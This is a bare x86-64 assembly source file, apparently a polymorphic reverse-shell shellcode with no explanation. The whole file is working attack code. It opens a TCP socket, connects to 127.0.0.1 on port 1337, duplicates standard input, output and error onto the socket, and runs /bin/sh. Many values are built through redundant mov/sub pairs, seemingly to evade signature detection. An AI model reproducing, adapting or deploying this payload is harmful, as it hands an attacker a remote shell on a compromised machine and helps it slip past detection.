BITS 64
global _start

section .text
_start: 
mov rax,0x01
sub rax,0x01
xor rdi,rdi
mov rsi,0x01
sub rsi,0x01
xor rdx,rdx
mov rdx,0x01
sub rdx,0x01
mov sil,0x01
mov dil,16
sub dil,14
mov al,0x29
syscall
mov r14b,al
mov dil,r14b
xor r11,r11
push 0x0100007f
push word 0x3905
push word 0x2
mov r8,rsp
mov rsi,r8
mov dl,0x10
mov al,48
sub al,6
syscall
mov r11,0x01
sub r11,0x01
mov dil,0x03
mov r9,r11
mov rsi,r9
mov al,0x21
syscall
xor r14,r14
mov r11,r14
mov dil,0x03
mov sil,6
sub sil,5
mov al,0x21
syscall;
xor r10,r10
mov r11,r10
mov dil,0x03
mov sil,8
sub sil,6
mov al,0x21
syscall;
mov rax,0x01
sub rax,0x01
xor rdi,rdi
mov rsi,0x01
sub rsi,0x01
xor r13,r13
mov r8b,59
mov al,r8b
mov rdi,"/bin/sh"
push r13
push rdi
mov r9,rsp
mov rdi,r9
push r13
push rdi
mov r8,rsp
mov rsi,r8
xor rdx,rdx
syscall
